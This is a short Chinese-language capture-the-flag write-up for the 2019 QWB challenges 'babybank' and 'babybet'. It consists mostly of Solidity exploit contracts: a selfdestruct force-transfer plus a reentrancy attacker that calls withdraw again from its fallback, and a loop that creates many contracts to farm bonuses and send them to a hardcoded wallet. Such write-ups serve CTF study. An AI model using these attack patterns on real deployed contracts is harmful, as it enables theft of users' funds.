# 第三届强网杯babybank&babybet

[babybank题目和exp](https://github.com/beafb1b1/challenges/tree/master/qwb/2019_crypto_babybank)

[babybet题目和exp](https://github.com/beafb1b1/challenges/tree/master/qwb/2019_crypto_babybet)

## babybank

强制转账余额后，重入攻击+整形溢出，最后payforflag

```js
contract transfer_force{
    
    address owner;
    
    function () payable {
    }
    
    constructor()public{
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function kill(address to) public onlyOwner {
        selfdestruct(to);
    }
}

contract reentrancy{
    address bb;
    uint have_withdraw;
    
    function set_bb(address target)
    {
        bb=target;
    }
    
    function withdraw(uint amount){
        babybank(bb).withdraw(amount);
    }
    
    function () payable {
        if (have_withdraw==0){
            have_withdraw=1;
            babybank(bb).withdraw(2);
        }
    }
    
    function getflag(string md5ofteamtoken,string b64email) public{
        babybank(bb).payforflag(md5ofteamtoken,b64email);
    }
}
```

## babybet

薅羊毛

```js
contract father {
    function father() payable {}
    babybet_attack son;
    function attack(uint256 times) public {
        for(uint i=0;i<times;i++){
            son = new babybet_attack();
        }
    }
    function () payable {
    }
}

contract babybet_attack{
    address bbb=0x5d7aacdf02186810d754cf24d2496b3bdf30d75b;
    address mywallet=0xdAA45B7958aF6B14dc8BFF097AddC449Bc39fB55;
    constructor() public{
        babybet(bbb).profit();
        babybet(bbb).bet(0);
        uint amount=babybet(bbb).balance(address(this));
        if (amount>500){
        babybet(bbb).transferbalance(mywallet,1000);}
    }
}
```